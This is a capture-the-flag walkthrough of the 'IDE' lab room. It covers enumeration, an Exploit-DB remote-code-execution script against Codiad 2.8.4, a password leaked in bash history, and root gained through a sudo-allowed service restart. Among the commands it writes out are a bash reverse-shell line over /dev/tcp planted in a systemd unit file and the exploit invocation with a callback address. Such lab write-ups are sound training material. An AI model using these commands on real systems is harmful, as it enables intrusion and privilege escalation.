# IDE

## Enmeration

### nmap

```
Discovered open port 21/tcp on 10.10.6.68
Discovered open port 80/tcp on 10.10.6.68
Discovered open port 22/tcp on 10.10.6.68
Discovered open port 62337/tcp on 10.10.6.68

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.226.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94RvPaQ09Xx+jMj32opOMbghuvx4OeBVLc+/4Hascmrtsa+SMtQGSY7b+eyW8Zymxi94rGBIN2ydPxy3XXGtkaCdQluOEw5CqSdb/qyeH+L/1PwIhLrr+jzUoUzmQil+oUOpVMOkcW7a00BMSxMCij0HdhlVDNkWvPdGxKBviBDEKZAH0hJEfexz3Tm65cmBpMe7WCPiJGTvoU9weXUnO3+41Ig8qF7kNNfbHjTgS0+XTnDXk03nZwIIwdvP8dZ8lZHdooM8J9u0Zecu4OvPiC4XBzPYNs+6ntLziKlRMgQls0e3yMOaAuKfGYHJKwu4AcluJ/+g90Hr0UqmYLHEV
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBzKTu7YDGKubQ4ADeCztKu0LL5RtBXnjgjE07e3Go/GbZB2vAP2J9OEQH/PwlssyImSnS3myib+gPdQx54lqZU=
|   256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+oGPm8ZVYNUtX4r3Fpmcj9T9F2SjcRg4ansmeGR3cP
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel



PORT      STATE SERVICE REASON  VERSION
62337/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
|_http-title: Codiad 2.8.4
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

### ffuf

```
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
components              [Status: 301, Size: 322, Words: 20, Lines: 10]
data                    [Status: 301, Size: 316, Words: 20, Lines: 10]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1]
index.php               [Status: 200, Size: 5239, Words: 1739, Lines: 87]
js                      [Status: 301, Size: 314, Words: 20, Lines: 10]
languages               [Status: 301, Size: 321, Words: 20, Lines: 10]
lib                     [Status: 301, Size: 315, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 319, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
themes                  [Status: 301, Size: 318, Words: 20, Lines: 10]
```

The room said enumeration is important so we took that personally.

full nmap scan or you miss the main thing...the real website is on port 62337

But first lets grab whatever is in ftp folder

At first I thought ftp folder was empty...the subfolder was named `...`

cd into it and find a file named `-`

```
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

nmap says the actual website use codiad 2.8.4

As we dont know what that is we google but found its a web ide

And there is an RCE vulnerability with exploitdb script

random passwords trials got us in the web ide (I was about to bruteforce with hydra lol)

`john : password`

As we can login we see the code john was workig on but nothing useful in it

let's use the exploit db python script to get inside

`python exploit.py http://10.10.172.231:62337/ john password 10.8.226.203 2311 linux`

And we are in

first we get comfortable

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

```
www-data@ide:/home$ cd drac
cd drac
www-data@ide:/home/drac$ ls
ls
user.txt
www-data@ide:/home/drac$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

I am not even surprised

```
ls -al
total 52
drwxr-xr-x 6 drac drac 4096 Aug 4 07:06 .
drwxr-xr-x 3 root root 4096 Jun 17 14:01 ..
-rw------- 1 drac drac 49 Jun 18 06:02 .Xauthority
-rw-r--r-- 1 drac drac 36 Jul 11 12:11 .bash_history
-rw-r--r-- 1 drac drac 220 Apr 4 2018 .bash_logout
-rw-r--r-- 1 drac drac 3787 Jul 11 11:53 .bashrc
drwx------ 4 drac drac 4096 Jun 18 06:03 .cache
drwxr-x--- 3 drac drac 4096 Jun 18 06:47 .config
drwx------ 4 drac drac 4096 Jun 18 06:48 .gnupg
drwx------ 3 drac drac 4096 Jun 18 05:49 .local
-rw-r--r-- 1 drac drac 807 Apr 4 2018 .profile
-rw-r--r-- 1 drac drac 0 Jun 17 14:03 .sudo_as_admin_successful
-rw------- 1 drac drac 557 Jun 18 05:49 .xsession-errors
-r-------- 1 drac drac 33 Jun 18 06:32 user.txt
```

ok drac only can read the flag but anyone can read his bash history...lol

that thing is supposed to go to void (/dev/null)

```
cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'

www-data@ide:/home/drac$ su drac
su drac
Password: Th3dRaCULa1sR3aL
```

`drac@ide:~$ cat user.txt`

And we got User Flag

Now privileges

## privilege escalation

```
sudo -l

Matching Defaults entries for drac on ide:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
(ALL : ALL) /usr/sbin/service vsftpd restart
```

The ftp service? hmm? I dont know

```
locate vsftpd.service
/etc/systemd/system/multi-user.target.wants/vsftpd.service

cd /etc/systemd/system/multi-user.target.wants

cat vsftpd.service

[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

Alright let's change the `ExecStart` to a reverse shell

```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.226.203/4444 0>&1'
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

We echo all that in `vsftpd.service` and listen with a new netcat on said port

Now we restart the service..reload daemon first

```
systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: Th3dRaCULa1sR3aL

==== AUTHENTICATION COMPLETE ===
```

```
drac@ide:/etc/systemd/system/multi-user.target.wants$ sudo /usr/sbin/service vsftpd restart
```

Aaand...NOTHING

I don't know why but I had to do the restart twice

```
root@ide:/# id
id
uid=0(root) gid=0(root) groups=0(root)

cat root.txt
```

Great room! Get some more!
